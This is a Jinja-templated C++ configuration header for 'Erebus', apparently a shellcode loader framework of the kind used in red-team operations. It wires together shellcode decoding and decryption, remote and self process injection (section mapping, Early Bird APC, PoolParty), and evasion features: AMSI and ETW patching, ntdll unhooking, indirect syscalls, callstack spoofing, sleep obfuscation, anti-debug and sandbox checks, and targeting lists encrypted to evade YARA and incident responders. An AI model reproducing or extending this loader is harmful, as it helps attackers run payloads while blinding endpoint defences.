#ifndef EREBUS_CONFIG
#define EREBUS_CONFIG
#pragma once

// ============================================
// COMPRESSION CONFIGURATION
// ============================================
// Compression method used for shellcode:
// 0 = NONE        - No decompression
// 1 = LZNT1       - LZNT1 compression
// 2 = RLE         - Run-Length Encoding
#define CONFIG_COMPRESSION_TYPE {{ COMPRESSION_TYPE }}

// ============================================
// ENCODING CONFIGURATION
// ============================================
// Encoding method used for shellcode:
// 0 = NONE        - No decoding
// 1 = BASE64      - Base64 encoding
// 2 = ASCII85     - ASCII85 encoding
// 3 = ALPHA32     - ALPHA32 encoding
// 4 = WORDS256    - WORDS256 encoding
#define CONFIG_ENCODING_TYPE {{ ENCODING_TYPE }}

#if CONFIG_ENCODING_TYPE == 1
#define DecodeShellcode erebus::DecodeBase64
#elif CONFIG_ENCODING_TYPE == 2
#define DecodeShellcode erebus::DecodeASCII85
#elif CONFIG_ENCODING_TYPE == 3
#define DecodeShellcode erebus::DecodeALPHA32
#elif CONFIG_ENCODING_TYPE == 4
#define DecodeShellcode erebus::DecodeWORDS256
#endif

// ============================================
// ENCRYPTION CONFIGURATION
// ============================================
// Encryption method used for shellcode:
// 0 = NONE        - No decryption
// 1 = XOR         - Simple XOR cipher
// 2 = RC4         - RC4 stream cipher
// 3 = AES_ECB     - AES in ECB mode
// 4 = AES_CBC     - AES in CBC mode
#define CONFIG_ENCRYPTION_TYPE {{ ENCRYPTION_TYPE }}
#if CONFIG_ENCRYPTION_TYPE == 1
#define DecryptShellcode erebus::DecryptionXor
#elif CONFIG_ENCRYPTION_TYPE == 2
#define DecryptShellcode erebus::DecryptionRc4
#endif

// ============================================
// INJECTION CONFIGURATION
// ============================================

// Target process for remote injection
#ifndef CONFIG_TARGET_PROCESS
#define CONFIG_TARGET_PROCESS L"{{ TARGET_PROCESS }}"
#endif

// Injection technique:
// 1 = NtMapViewOfSection  - Section mapping injection (Remote)
// 2 = CreateFiber         - Fiber-based execution (Self)
// 3 = EarlyCascade        - Early Bird APC injection via NtQueueApcThread (Remote)
// 4 = PoolParty           - Worker Factory thread pool injection (Remote)
// 5 = NtQueueApcThread    - Vanilla NtQueueApcThread Early Bird with jittered post-APC delay (Remote)
#ifndef CONFIG_INJECTION_TYPE
#define CONFIG_INJECTION_TYPE {{ INJECTION_TYPE }}
#endif

#if CONFIG_INJECTION_TYPE == 2 || CONFIG_INJECTION_TYPE == 6 || CONFIG_INJECTION_TYPE == 7
#define CONFIG_INJECTION_MODE 2  // Self injection
#else
#define CONFIG_INJECTION_MODE 1  // Remote injection
#endif

#if CONFIG_INJECTION_TYPE == 1
#define ExecuteShellcode erebus::InjectionNtMapViewOfSection
#elif CONFIG_INJECTION_TYPE == 2
#define ExecuteShellcode erebus::InjectionCreateFiber
#elif CONFIG_INJECTION_TYPE == 3
#define ExecuteShellcode erebus::InjectionEarlyCascade
#elif CONFIG_INJECTION_TYPE == 4
#define ExecuteShellcode erebus::InjectionPoolParty
#elif CONFIG_INJECTION_TYPE == 5
#define ExecuteShellcode erebus::InjectionNtQueueApcThread
#endif

// ============================================
// GUARDRAILS CONFIGURATION
// ============================================

#include "guardrails/guardrails.hpp"

// Enable/disable guardrails checks at compile time
#define CONFIG_GUARDRAILS_ENABLED {{ GUARDRAILS_ENABLED }}
#define CONFIG_GUARDRAILS_CHECK_DEBUGGER {{ GUARDRAILS_CHECK_DEBUGGER }}
#define CONFIG_GUARDRAILS_CHECK_REMOTE_DEBUGGER {{ GUARDRAILS_CHECK_REMOTE_DEBUGGER }}
#define CONFIG_GUARDRAILS_CHECK_DEBUGGER_PROCESSES {{ GUARDRAILS_CHECK_DEBUGGER_PROCESSES }}
#define CONFIG_GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS {{ GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS }}
#define CONFIG_GUARDRAILS_CHECK_TIMING {{ GUARDRAILS_CHECK_TIMING }}
#define CONFIG_GUARDRAILS_CHECK_SANDBOX {{ GUARDRAILS_CHECK_SANDBOX }}

// Additional targeting checks. These default to 0 so existing builds
// behave identically. Flip via new builder parameters when rolling out.
#define CONFIG_GUARDRAILS_CHECK_DOMAIN_JOINED {{ GUARDRAILS_CHECK_DOMAIN_JOINED | default(0) }}

// Decoy file to open when guardrails fail (empty = silent exit)
#define CONFIG_GUARDRAILS_DECOY_FILE "{{ GUARDRAILS_DECOY_FILE }}"

// ============================================
// SYSCALL BACKEND CONFIGURATION
// ============================================
// 0 = TartarusGate  (built-in indirect syscall shim page, default)
// 1 = SysWhispers3  (generated stubs; requires include/evasion/sw3/ files and
//                    the Syscalls-asm.x{64,86}.asm sources assembled by the
//                    loader Makefile)
#ifndef CONFIG_SYSCALL_BACKEND
#define CONFIG_SYSCALL_BACKEND {{ SYSCALL_BACKEND | default(0) }}
#endif

// ============================================
// CALLSTACK SPOOFING CONFIGURATION
// ============================================
// 0 = disabled
// 1 = enabled - InitCallstackSpoof() runs in RunEvasionPatches(), locating
//     `add rsp, 0x68; ret` in the operator-selected module list below.
//     Call sites fill SpoofContext and dispatch through SpoofCall()
//     (src/evasion/callstack_spoof_gas.S).
#ifndef CONFIG_CALLSTACK_SPOOF_ENABLED
#define CONFIG_CALLSTACK_SPOOF_ENABLED {{ CALLSTACK_SPOOF_ENABLED | default(0) }}
#endif

// Operator-selected gadget host modules. InitCallstackSpoof() iterates this
// list in order and keeps the first match. Modules must already be mapped
// into the host process (resolution is PEB-walk only). The gadget
// displacement is fixed at 0x68 to match callstack_spoof_gas.S's stack
// frame; changing it requires matching edits to the ASM `sub rsp, 112`.
{%- set _cs_mods = CALLSTACK_SPOOF_MODULES | default(["ntdll.dll", "kernel32.dll", "kernelbase.dll"]) %}
#ifndef CONFIG_CALLSTACK_SPOOF_MODULE_COUNT
#define CONFIG_CALLSTACK_SPOOF_MODULE_COUNT {{ _cs_mods | length }}
#endif
#ifndef CONFIG_CALLSTACK_SPOOF_MODULES
#define CONFIG_CALLSTACK_SPOOF_MODULES \
    {%- for _m in _cs_mods %}
            erebus::HashStringFowlerNollVoVariant1a("{{ _m }}"){% if not loop.last %}, \{% endif %}
    {%- endfor %}

#endif

// ============================================
// SLEEP OBFUSCATION CONFIGURATION
// ============================================
// Pre-injection dwell mode:
// 0 = None      - no dwell (execute immediately)
// 1 = Timer     - WaitableTimer jittered dwell (anti-sandbox timing bypass)
// 2 = Ekko-lite - Timer + XOR non-.text PE sections during wait
#ifndef CONFIG_SLEEP_OBFUSCATION_TYPE
#define CONFIG_SLEEP_OBFUSCATION_TYPE {{ SLEEP_OBFUSCATION_TYPE | default(0) }}
#endif

#ifndef CONFIG_SLEEP_OBFUSCATION_BASE_MS
#define CONFIG_SLEEP_OBFUSCATION_BASE_MS {{ SLEEP_OBFUSCATION_BASE_MS | default(5000) }}
#endif

#ifndef CONFIG_SLEEP_OBFUSCATION_JITTER_MS
#define CONFIG_SLEEP_OBFUSCATION_JITTER_MS {{ SLEEP_OBFUSCATION_JITTER_MS | default(3000) }}
#endif

// ============================================
// AMSI BYPASS CONFIGURATION
// ============================================
// 0 = None
// 1 = Patch AmsiScanBuffer only (default)
// 2 = Patch AmsiScanBuffer + AmsiOpenSession
// 3 = All + InvalidateAmsiContext (heap walk)
#ifndef CONFIG_AMSI_BYPASS_TYPE
#define CONFIG_AMSI_BYPASS_TYPE {{ AMSI_BYPASS_TYPE | default(1) }}
#endif

// ============================================
// ETW BYPASS CONFIGURATION
// ============================================
// 0 = None
// 1 = Patch EtwEventWrite only (default)
// 2 = Patch EtwEventWrite + EtwEventWriteFull
// 3 = All + UnregisterEtwProviders (TEB walk)
#ifndef CONFIG_ETW_BYPASS_TYPE
#define CONFIG_ETW_BYPASS_TYPE {{ ETW_BYPASS_TYPE | default(1) }}
#endif

// ============================================
// UNHOOK SCOPE CONFIGURATION
// ============================================
// 0 = ntdll only (default)
// 1 = ntdll + kernel32 + kernelbase
// 2 = selective (pre-defined sensitive Nt* function list)
#ifndef CONFIG_UNHOOK_SCOPE
#define CONFIG_UNHOOK_SCOPE {{ UNHOOK_SCOPE | default(0) }}
#endif

// XOR key for obfuscating patch byte arrays (single byte, 0x01–0xFF)
#ifndef CONFIG_PATCH_XOR_KEY
#define CONFIG_PATCH_XOR_KEY {{ PATCH_XOR_KEY | default("0xAB") }}
#endif

// --------------------------------------------------------------------------
// Environment whitelists / blocklists (XOR-encrypted at build time)
// --------------------------------------------------------------------------
// Guardrail scoping entries (hostnames, usernames, domains, IPs) are emitted
// as XOR-encrypted byte arrays in .data, decrypted in place on first call to
// GetGuardrailConfig(). This defeats `strings` and family-level YARA string
// hunts against delivered samples - a determined reverser can still recover
// them since the key is adjacent to the ciphertext, which is acceptable for
// scoping data (we only need to frustrate automated triage and avoid leaking
// targeting to incident response).
//
// Each entry's ciphertext includes the trailing NUL byte, also XORed. After
// decryption the byte array is a valid C string. Pointers are stored into
// g_*_ptrs[] arrays which are what GuardrailConfig consumes.

#define GR_XOR_KEYLEN {{ GR_XOR_KEY | length }}
// __attribute__((unused)) silences -Wunused-variable for builds where no
// guardrail list is populated and DecryptGuardrailLists() is effectively
// empty. The key still lives in .data and is consulted on first call when
// any list is non-empty.
__attribute__((unused))
static unsigned char g_gr_xor_key[GR_XOR_KEYLEN] = { {% for b in GR_XOR_KEY %}0x{{ '%02x' % b }},{% endfor %} };

{% macro emit_enc_list(varname, entries) -%}
{% if entries %}
{% for entry in entries %}
static unsigned char {{ varname }}_{{ loop.index0 }}[] = { {% for b in entry %}0x{{ '%02x' % b }},{% endfor %} };
{% endfor %}
static const char* {{ varname }}_ptrs[{{ entries | length }}];
{% endif %}
{%- endmacro %}

{{ emit_enc_list('g_gr_allowed_hostnames', GR_ENC_GUARDRAIL_ALLOWED_HOSTNAMES) }}
{{ emit_enc_list('g_gr_blocked_hostnames', GR_ENC_GUARDRAIL_BLOCKED_HOSTNAMES) }}
{{ emit_enc_list('g_gr_blocked_usernames', GR_ENC_GUARDRAIL_BLOCKED_USERNAMES) }}
{{ emit_enc_list('g_gr_allowed_ips',       GR_ENC_GUARDRAIL_ALLOWED_IPS) }}
{{ emit_enc_list('g_gr_blocked_ips',       GR_ENC_GUARDRAIL_BLOCKED_IPS) }}
{{ emit_enc_list('g_gr_allowed_domains',   GR_ENC_GUARDRAIL_ALLOWED_DOMAINS) }}

{% macro decrypt_list(varname, entries) -%}
{% if entries %}
{% for entry in entries %}
    for (unsigned int i = 0; i < sizeof({{ varname }}_{{ loop.index0 }}); ++i) {
        {{ varname }}_{{ loop.index0 }}[i] ^= g_gr_xor_key[i % GR_XOR_KEYLEN];
    }
    {{ varname }}_ptrs[{{ loop.index0 }}] = (const char*){{ varname }}_{{ loop.index0 }};
{% endfor %}
{% endif %}
{%- endmacro %}

// Idempotent on-demand decryption. Runs from GetGuardrailConfig() which is
// called once at loader entry, before any guardrail check. [MALLEABLE] swap
// XOR for RC4 here if you need stronger static-analysis resistance.
inline void DecryptGuardrailLists() {
    static bool decrypted = false;
    if (decrypted) return;
    {{ decrypt_list('g_gr_allowed_hostnames', GR_ENC_GUARDRAIL_ALLOWED_HOSTNAMES) }}
    {{ decrypt_list('g_gr_blocked_hostnames', GR_ENC_GUARDRAIL_BLOCKED_HOSTNAMES) }}
    {{ decrypt_list('g_gr_blocked_usernames', GR_ENC_GUARDRAIL_BLOCKED_USERNAMES) }}
    {{ decrypt_list('g_gr_allowed_ips',       GR_ENC_GUARDRAIL_ALLOWED_IPS) }}
    {{ decrypt_list('g_gr_blocked_ips',       GR_ENC_GUARDRAIL_BLOCKED_IPS) }}
    {{ decrypt_list('g_gr_allowed_domains',   GR_ENC_GUARDRAIL_ALLOWED_DOMAINS) }}
    decrypted = true;
}

// Helper function to get configured guardrails
inline erebus::guardrails::GuardrailConfig GetGuardrailConfig() {
    erebus::guardrails::GuardrailConfig config = erebus::guardrails::GetDefaultConfig();

    #if CONFIG_GUARDRAILS_ENABLED
        DecryptGuardrailLists();

        config.check_debugger_present      = CONFIG_GUARDRAILS_CHECK_DEBUGGER;
        config.check_remote_debugger       = CONFIG_GUARDRAILS_CHECK_REMOTE_DEBUGGER;
        config.check_debugger_processes    = CONFIG_GUARDRAILS_CHECK_DEBUGGER_PROCESSES;
        config.check_hardware_breakpoints  = CONFIG_GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS;
        config.check_timing_checks         = CONFIG_GUARDRAILS_CHECK_TIMING;
        config.check_sandbox_environment   = CONFIG_GUARDRAILS_CHECK_SANDBOX;
        config.check_domain_joined         = CONFIG_GUARDRAILS_CHECK_DOMAIN_JOINED;

        {% if GUARDRAIL_ALLOWED_PARENTS %}
        static const char* g_gr_allowed_parents[] = {
        {% for p in GUARDRAIL_ALLOWED_PARENTS %}"{{ p }}",
        {% endfor %}
        };
        config.allowed_parents      = g_gr_allowed_parents;
        config.parent_count_allowed = (int)(sizeof(g_gr_allowed_parents) / sizeof(g_gr_allowed_parents[0]));
        {% endif %}

        {% if GUARDRAIL_ALLOWED_LOCALES %}
        static const char* g_gr_allowed_locales[] = {
        {% for l in GUARDRAIL_ALLOWED_LOCALES %}"{{ l }}",
        {% endfor %}
        };
        config.allowed_locales      = g_gr_allowed_locales;
        config.locale_count_allowed = (int)(sizeof(g_gr_allowed_locales) / sizeof(g_gr_allowed_locales[0]));
        {% endif %}

        {% if GR_ENC_GUARDRAIL_ALLOWED_HOSTNAMES %}
        config.allowed_hostnames      = g_gr_allowed_hostnames_ptrs;
        config.hostname_count_allowed = {{ GR_COUNT_GUARDRAIL_ALLOWED_HOSTNAMES }};
        {% endif %}
        {% if GR_ENC_GUARDRAIL_BLOCKED_HOSTNAMES %}
        config.blocked_hostnames      = g_gr_blocked_hostnames_ptrs;
        config.hostname_count_blocked = {{ GR_COUNT_GUARDRAIL_BLOCKED_HOSTNAMES }};
        {% endif %}
        {% if GR_ENC_GUARDRAIL_BLOCKED_USERNAMES %}
        config.blocked_usernames      = g_gr_blocked_usernames_ptrs;
        config.username_count_blocked = {{ GR_COUNT_GUARDRAIL_BLOCKED_USERNAMES }};
        {% endif %}
        {% if GR_ENC_GUARDRAIL_ALLOWED_IPS %}
        config.allowed_ips      = g_gr_allowed_ips_ptrs;
        config.ip_count_allowed = {{ GR_COUNT_GUARDRAIL_ALLOWED_IPS }};
        {% endif %}
        {% if GR_ENC_GUARDRAIL_BLOCKED_IPS %}
        config.blocked_ips      = g_gr_blocked_ips_ptrs;
        config.ip_count_blocked = {{ GR_COUNT_GUARDRAIL_BLOCKED_IPS }};
        {% endif %}
        {% if GR_ENC_GUARDRAIL_ALLOWED_DOMAINS %}
        config.allowed_domains      = g_gr_allowed_domains_ptrs;
        config.domain_count_allowed = {{ GR_COUNT_GUARDRAIL_ALLOWED_DOMAINS }};
        {% endif %}
    #endif

    return config;
}

#endif
